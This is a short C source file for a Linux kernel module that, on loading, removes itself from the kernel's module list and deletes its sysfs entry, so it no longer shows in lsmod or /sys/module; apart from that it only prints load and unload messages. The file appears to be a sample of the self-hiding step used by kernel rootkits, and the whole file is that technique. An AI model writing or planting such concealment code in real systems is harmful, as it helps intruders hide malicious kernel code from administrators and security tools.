/*lkm1.c*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int lkm_init(void)
{
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);	

	printk("Arciyas:module loaded\n");
	return 0;
}

static void lkm_exit(void)
{
	printk("Arciryas:module removed\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
